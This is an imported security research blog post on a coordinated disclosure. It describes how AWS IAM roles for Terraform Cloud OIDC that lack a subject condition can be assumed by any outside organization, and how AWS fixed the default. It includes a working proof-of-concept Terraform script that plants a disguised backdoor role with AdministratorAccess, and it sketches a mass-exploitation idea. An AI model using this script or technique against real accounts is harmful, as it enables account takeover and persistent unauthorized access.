---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-15_addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess.md
original_filename: 2024-08-15_addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess.md
title: 'Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess'
category: documents
detected_topics:
- sso
- cloud-security
- oauth
- access-control
- command-injection
- otp
tags:
- imported
- documents
- sso
- cloud-security
- oauth
- access-control
- command-injection
- otp
language: en
raw_sha256: 43ed16b1e33742eb850a3885f696430467316340d2755f58fec9b3bf980a9282
text_sha256: 4814bbd85ee0341ef683de9df0ad1f5e11ebd523320934ebdcfe4dc16ecba987
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: false
---

# Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-15_addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess.md
- Source Type: markdown
- Detected Topics: sso, cloud-security, oauth, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: False
- Raw SHA256: `43ed16b1e33742eb850a3885f696430467316340d2755f58fec9b3bf980a9282`
- Text SHA256: `4814bbd85ee0341ef683de9df0ad1f5e11ebd523320934ebdcfe4dc16ecba987`


## Content

---
title: "Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess"
page_title: "Addressed AWS Default Risks: OIDC, Terraform and Admin Access"
url: "https://hacktodef.com/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess"
final_url: "https://hacktodef.com/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess"
authors: ["Eduard Agavriloae (@saw_your_packet)"]
programs: ["AWS"]
bugs: ["Cloud", "OIDC", "Terraform", "Privilege escalation"]
publication_date: "2024-08-15"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 67
---

# Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess

An open invitation for administrative access

UpdatedAugust 15, 2024

•11 min read•[ __View as Markdown](/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess.md)

![Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess](/_next/image?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1717956282978%2F05f68c36-8be3-4b36-8933-588643870223.png&w=3840&q=75)

[ E](https://hashnode.com/@sawyourpacket)

[Eduard Agavriloae](https://hashnode.com/@sawyourpacket)

[ __](https://twitter.com/saw_your_packet)[__](https://www.linkedin.com/in/eduard-k-agavriloae/)

Cybersecurity Researcher, AWS Offensive Security Expert, experienced penetration tester and ex web developer.

On this page

IntroductionExplaining concepts: Web Identity, OIDC and TerraformThe attack: single targetThe attack: mass exploitationAWS's responseImproving the Web PortalContacting customersDefending against thisConclusionsFurther readings

Before we begin, here is a message from AWS that I also support:

_AWS has taken the feedback and has implemented improvements in the default Terraform OIDC Trust Policy. AWS has also contacted customers who may have been in this configuration. AWS recommends customers always test their configurations before doing so in production, but when they do, limit the condition key "Subject" or "sub" to prevent organizations outside of your control from assuming roles associated with the federated identity providers set up in their AWS account. More can be found here:_ [_https://docs.aws.amazon.com/IAM/latest/UserGuide/id\\_roles\\_create\\_for-idp\\_oidc.html_](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-idp_oidc.html)

The article brings to light another story about a possible cloud mass exploitation, but this time mistakes are easier to make when administrators overlook the implications of these configurations. The result? **Unintentional Administrative access from the internet to any resources authorized by the misconfiguration**.

## Introduction

This is not a story about a finding from an engagement. It begins there, but the main idea is how this can lead to mass exploitation of random AWS accounts. Let's get started!

I was conducting an AWS security configuration review for a collaboration with Syn Cubes. I was searching for IAM roles that could be assumed by service accounts from an EKS cluster. Specifically, I was looking for trust policies like the one below:

![Screenshot of an AWS IAM role named "sa-eks-role" showing its trust relationships. The summary section includes the creation date \(March 19, 2024, 14:08 UTC+02:00\), ARN, and maximum session duration \(1 hour\). The "Trusted entities" section displays a JSON policy allowing federated access to a specific OIDC provider with conditions based on string equality.](https://cdn.hashnode.com/res/hashnode/image/upload/v1717696482645/5427cae1-7d88-4b50-87a4-e82e195d4c5f.png)

If you're not familiar with this type of role trust policy, don't worry, we'll cover it in the next chapter. For the moment, notice that there are two conditions for these types of trust policies:

  * The "aud" (audience) condition

  * The "sub" (subject) condition

Essentially, the audience is not as important as the subject. With the subject condition, you limit who or what can assume this role. In the trust policy above, the role can only be assumed by the service account "my-service-account" from the K8s namespace "my-namespace" in the EKS cluster that matches the web identity mentioned in the "Federated" field.

As you can see, this is very specific (as it should be). And if you put some `*` (asterisks) in the namespace name or service account name, then you can have some privilege escalation from the EKS cluster to your AWS account.

In any case, this is what I was looking for. Among the last roles, here is what I found as a trust policy (the screenshot is from my own AWS account):

![A screenshot of the AWS IAM console showing the summary and trust relationships for a specific role. The summary section includes the creation date, ARN, and maximum session duration. The trust relationships tab is active, displaying a JSON policy that defines the trusted entities and conditions for assuming the role.](https://cdn.hashnode.com/res/hashnode/image/upload/v1717697198031/68ab033a-e030-4a1f-b518-1b0c4a1a342e.png)

First off, this is not for EKS but for Terraform Cloud. However, do you notice something strange? We have only one condition in this trust policy, for the audience. When I checked the permissions of this role, I saw that it had AdministratorAccess, which makes sense since it was a role for Terraform.

A secure trust policy would look something like the one below. Essentially, we want to limit which Terraform Cloud organization can assume this role. This way, only our organization will be able to access the role. Terraform Cloud mentions this in their official setup documentation: <https://developer.hashicorp.com/terraform/cloud-docs/workspaces/dynamic-provider-credentials/aws-configuration>
  
  
  {
  "Version": "2012-10-17",
  "Statement": [
  {
  "Effect": "Allow",
  "Principal": {
  "Federated": "arn:aws:iam::<aws-account-id>:oidc-provider/app.terraform.io"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
  "StringEquals": {
  "app.terraform.io:aud": "aws.workload.identity"
  },
  "StringLike": {
  "app.terraform.io:sub": "organization:<your-terraform-organization>:project:*:workspace:*:run_phase:*"
  }
  }
  }
  ]
  }
  

Well, the AdministratorAccess permissions made it worth investigating further. So I asked myself: without the subject condition, it this role assumable by anyone? And if it is, how can I do it?

## Explaining concepts: Web Identity, OIDC and Terraform

Web Identity in AWS allows users to authenticate and authorize access to AWS resources using identities from external web identity providers like Amazon, Google, or Terraform. This is done through AWS Security Token Service (STS), which supports the AssumeRoleWithWebIdentity API call. This API call lets applications request temporary security credentials for users who have authenticated through an external web identity provider.

OIDC stands for OpenID Connect and is an identity layer built on top of the OAuth 2.0 protocol. In AWS, OIDC is used to federate identities from external identity providers, such as Google, Facebook or Terraform, allowing users to access AWS resources using their existing credentials.

If you didn't understand much don't worry, it was confusing for me too in the beginning. Here is how it's used in practice, giving as example Terraform. So, instead of creating a set of AWS access keys for a user with administrator permissions and worry that they might get exposed, I can configure an IAM role with OIDC for Terraform Cloud.

![A diagram illustrating the process of using Terraform Cloud. It starts with a DevOps engineer logging into Terraform Cloud, running a Terraform script, which is then uploaded to the organization's Terraform account. Terraform Cloud assumes the role and executes the script, interacting with an IAM Role with OIDC trust policy for Terraform.](https://cdn.hashnode.com/res/hashnode/image/upload/v1717700864427/9130cb5d-9fda-422d-9a5f-3ce80bdf7dee.jpeg)

Now, I can login to the Terraform Cloud platform from my local terminal. When I run a Terraform script, it gets uploaded to Terraform Cloud. The platform then assumes the IAM role and executes the script. This means there are no long-term access credentials that could be stolen by hackers or accidentally pushed to a public repository. This is a much better way to use Terraform in AWS.

And this is how HashiCorp Cloud Platform (HCP) Terraform works. I wanted to use the official name, but for simplicity, I will keep referring to this platform as Terraform Cloud.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1717701327968/3cc918b0-5fa2-489b-beb7-d8c2f4782023.png)

## The attack: single target

The idea was simple. I would make an organization in Terraform Cloud (app.terraform.io) and configure my organization to assume the target AWS role when executing Terraform scripts.

How can you do this? In short, you need to set two environment variables in Terraform Cloud when configuring your workspace. Here’s how I did it for my talk about privilege escalation in AWS at the DefCamp Cluj-Napoca edition. In the image below, I configured the workspace "defcamp" from the organization "poc-demo-test" to assume an AWS IAM role by setting the following environment variables:

  * TFC_AWS_PROVIDER_AUTH: true

  * TFC_AWS_RUN_ROLE_ARN: arn:aws:iam::<aws-account-id>:role/<role-name>

![Screenshot of the Terraform Cloud workspace variables page for the workspace named "defcamp." The page shows the workspace ID, status as "Unlocked," and Terraform version 1.3.8. There are sections for "Variables," "Sensitive variables," and "Workspace variables," with two workspace variables listed: "TFC_AWS_PROVIDER_AUTH" with the value "true" and "TFC_AWS_RUN_ROLE_ARN" with an ARN value. The sidebar on the left includes navigation options such as Overview, Runs, States, Variables, and Settings.](https://cdn.hashnode.com/res/hashnode/image/upload/v1717739789262/d7489ece-52e7-4ffc-9b05-21f500d6b927.png)

Now you just need to authenticate from your local Terraform CLI terminal to Terraform Cloud and you can execute the scripts.

I imagine you want to test this on your infrastructure and not on someone's else, so here are the links that would help you configure your test environment with everything you need:

  * <https://aws.amazon.com/blogs/apn/simplify-and-secure-terraform-workflows-on-aws-with-dynamic-provider-credentials/>

  * <https://developer.hashicorp.com/terraform/cloud-docs/workspaces/dynamic-provider-credentials/aws-configuration>

And here is a PoC Terraform script:
  
  
  terraform {
  cloud {
  organization = "poc-demo-test"
  workspaces {
  name = "defcamp"
  }
  }
  }
  
  provider "aws" {
  region = "eu-central-1"
  }
  
  resource "aws_iam_role" "create_role" {
  name  = "AWSServicesRoleForAutomation"
  assume_role_policy = jsonencode({
  "Version" : "2012-10-17",
  "Statement": [
  {
  "Effect": "Allow",
  "Principal": {
  "AWS": "arn:aws:iam::944212009752:root"
  },
  "Action": "sts:AssumeRole",
  "Condition": {}
  }
  ]
  })
  }
  
  resource "aws_iam_policy_attachment" "create_role_backdoor" {
  name  = "create_role_backdoor"
  roles  = [aws_iam_role.create_role.name]
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
  }
  

The script creates a new role called "AWSServicesRoleForAutomation" that can be assumed by an external AWS account. This acts as a backdoor, and the role's name is designed to be less noticeable. Then, the script attaches the AdministratorAccess policy to this role.

The next video demonstrates the attack in action. In the first part, you'll see the cloud engineer's perspective as they follow the standard steps to create a role for a web identity. The second part shows how an attacker can exploit this.

<https://youtu.be/3lMc2JV4p1Y>

## The attack: mass exploitation

OK, so we saw that this works. To recap, if you know the AWS account ID and the name of a role that doesn't have the "subject" condition, then you can compromise that AWS account from the internet.

Of course, this misconfiguration is easy to spot during a cloud configuration review because you have read permissions over IAM. However, I have an idea for doing this without visibility. Hear me out!

All you need are many AWS account IDs and some possible role names. I even found an article discussing ways to collect AWS account IDs: <https://blog.plerion.com/tapping-leaking-aws-account-id-faucet/> wrote by [Daniel Grzelak](https://www.linkedin.com/in/danielgrzelak/)

So, it would essentially be a brute force method where we try various role names like "terraform" and "terraform-oidc" for each collected AWS account ID.

While I had everything planned, I decided to communicate my concerns and research idea about OIDC roles with AWS's security team. They asked me not to conduct the research because I would be accessing resources that were not public.

![A close-up of a person in a suit wiping away a tear. Photo by Tom Pumford on Unsplash.](https://cdn.hashnode.com/res/hashnode/image/upload/v1723677485982/a1040e5b-52e3-4bab-bcd3-fe64cf50e9b0.jpeg)

Even though my method would not modify existing resources or read sensitive data, I understand their concern. Since I only had a hypothetical research idea, the next step was to coordinate with AWS on publishing this article after they addressed the default behavior.

## AWS's response

Once again, it was a pleasure working with the AWS Security Team. AWS has taken the feedback and has implemented improvements in the default Terraform OIDC Trust Policy. AWS has also contacted customers who may have been in this configuration.

### Improving the Web Portal

One of the improvement is adding a mandatory text area for the "Organization" name, which will be put in the "Subject" condition:

![Screenshot of AWS IAM console showing the "Trusted entity type" and "Web identity" sections. The "Web identity" option is selected, and fields for Identity provider, Audience, and Organization are displayed. There is an error message indicating that an organization must be supplied for this policy.](https://cdn.hashnode.com/res/hashnode/image/upload/v1723674401344/b11cd061-0734-4e16-a7e7-9a92a1e92c33.jpeg)

This makes it harder for administrators to create Terraform Cloud OIDC roles without restricting the organization that can assume the role. Attending [Nick Frichette](https://www.linkedin.com/in/nick-frichette/)'s talk "Kicking in the Door to the Cloud - Exploiting Cloud Provider Vulnerabilities for Initial Access" at Black Hat, I realized it is not only about Terraform. Other Identity Providers, like GitHub Actions, have similar risks and similar fixes.

Discussing this with Nick, I realized that instead of implementing fixes for each Identity Provider, there should be a general fix for all providers. The way I see it, the Identity Provider could try to assume the role from an identity they control.

Essentially, if the provider can use an identity outside the customer's control to assume the customer's role, then my suggestion for the Identity Provider is to stop the flow and ask for better control over the trust role assumption policy. I don't know if this would be the right method, but maybe it's the right starting point for the final fix.

### Contacting customers

AWS contacted customers who might have been affected. How do I know this? Well, that's what they said. Additionally however, I introduced the misconfiguration in my environment because I expected AWS to contact customers, and I wanted to understand the customer's perspective on the research.

For this, I created a Terraform Cloud role based on OIDC with an insecure trust role policy that lacked the "Subject" condition. To ensure I won't have to pay for cryptomining, I had to prevent others from assuming the role. I included a GUID in the role's name and set a Service Control Policy (SCP) that denied all actions for this role.

As you can see below, I received an email that informed be about the misconfiguration. Awesome!

![An email from Amazon Web Services alerts a user named Eduard about a misconfiguration in role trust policies of an AWS account, potentially allowing unintended actors to assume roles. The email explains the issue relates to HashiCorp Cloud Platform \(HCP\) Terraform as an Open ID Connect identity provider and suggests actions to restrict access. Links for further information and AWS support are provided at the end.](https://cdn.hashnode.com/res/hashnode/image/upload/v1723676827758/628bd495-265d-4b44-9201-d137213b44b2.png)

## Defending against this

I would like to get your input on this if you are a defender. Here is what I had in mind:

  * Create a Lambda Function

  * Make it run once or twice a day

  * The function will check the trust policy of all your OIDC roles to ensure they have the "subject" condition

  * If an OIDC role doesn't have it, raise an alert or remove the permissions from that role

Usually, I recommend doing a cloud configuration review with a third party, but this misconfiguration is the kind of thing that can happen just the day after the review is finished.

So, the Lambda Function should help. What are your thoughts on this? Do you think there is a better way to identify and fix this?

Also, if you are using a third-party solution for your cloud security posture, can you check if they detect this misconfiguration?

## Conclusions

It seems there are still misconfigurations that can elevate access from anonymous to AdministratorAccess, all from the internet.

While companies focus on which hacking groups might target them, the reality is they can be compromised by various mass exploitation attacks from random threat actors.

Lastly, I believe OIDC-based roles need a general hardening strategy that works for all identity providers. Fixes for specific providers are helpful, but this approach will always lag behind the speed at which customers introduce misconfigurations.

You can get more articles like this by subscribing to the blog's newsletter. Thanks for reading and following my work!

### Further readings

Similar to the Terraform issue, a known attack vector on OIDC IdP involves GitHub and GitHub Actions. Here are some links if you want to explore this topic further:

  1. <https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/>

  2. <https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8>

  3. <https://www.rezonate.io/blog/github-misconfigurations-put-gcp-aws-in-account-takeover-risk/>

  4. <https://dagrz.com/writing/aws-security/hacking-github-aws-oidc/>

  5. <https://awsteele.com/blog/2023/01/11/improve-github-actions-oidc-security-posture-with-custom-issuer.html>

[#aws](/tag/aws)[#aws-security](/tag/aws-security)[#hacking](/tag/hacking)[#terraform](/tag/terraform)[#research](/tag/research)[#cloud-security](/tag/cloud-security)

 __7.8K views
